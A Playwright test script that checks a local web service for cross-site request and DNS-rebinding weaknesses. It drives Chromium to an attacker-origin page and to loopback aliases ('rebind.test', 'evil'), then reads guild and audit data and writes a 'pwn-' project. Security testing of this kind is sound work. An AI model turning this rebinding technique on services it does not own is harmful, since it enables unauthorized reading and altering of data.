// Drive Chromium (no proxy) to a page on another origin that attacks the service, and to the service
// under a rebound name (Chromium's host resolver maps rebind.test and the dotless name evil to 127.0.0.1,
// the state a DNS-rebinding attack reaches once the name points at loopback).
// Usage: node cross_site.mjs http://127.0.0.1:8900 http://127.0.0.1:8901
import { chromium } from '/home/user/openFermentUI/node_modules/playwright/index.mjs';

const [svc, attacker] = process.argv.slice(2);
const svcPort = new URL(svc).port;
const browser = await chromium.launch({
  executablePath: '/opt/pw-browsers/chromium',
  args: ['--no-proxy-server', '--host-resolver-rules=MAP rebind.test 127.0.0.1, MAP evil 127.0.0.1'],
});
const page = await browser.newPage();
const seen = [];
page.on('request', (r) => { if (r.url().startsWith(svc)) seen.push(`${r.method()} ${r.url()} origin=${r.headers()['origin'] ?? '-'}`); });
page.on('response', (r) => { if (r.url().startsWith(svc)) seen.push(`  -> ${r.status()} ${r.url()}`); });
await page.goto(`${attacker}/attack.html?svc=${encodeURIComponent(svc)}`);
await page.waitForFunction(() => window.results && window.results.done, null, { timeout: 30000 });
await page.waitForTimeout(1500);
console.log('cross-site page results:', JSON.stringify(await page.evaluate(() => window.results), null, 1));
console.log('requests the browser sent to the service:\n' + seen.join('\n'));

for (const host of ['rebind.test', 'evil']) {
  const p = await browser.newPage();
  const origin = `http://${host}:${svcPort}`;
  const r0 = await p.goto(origin + '/');
  const out = await p.evaluate(async () => {
    const res = {};
    const g = await fetch('/api/guild', { headers: { 'X-OpenFerment-Project': 'p1' } });
    res.guild = g.status + ' ' + (await g.text()).slice(0, 300);
    const a = await fetch('/api/audit', { headers: { 'X-OpenFerment-Project': 'p1' } });
    res.audit = a.status + ' ' + (await a.text()).slice(0, 200);
    const w = await fetch('/api/projects', { method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: 'pwn-' + location.hostname.replace(/\W/g, ''), name: 'rebound', by: 'attacker' }) });
    res.write = w.status + ' ' + (await w.text()).slice(0, 200);
    return res;
  });
  console.log(`\nunder ${origin} (index ${r0.status()}):`, JSON.stringify(out, null, 1));
  await p.close();
}
await browser.close();
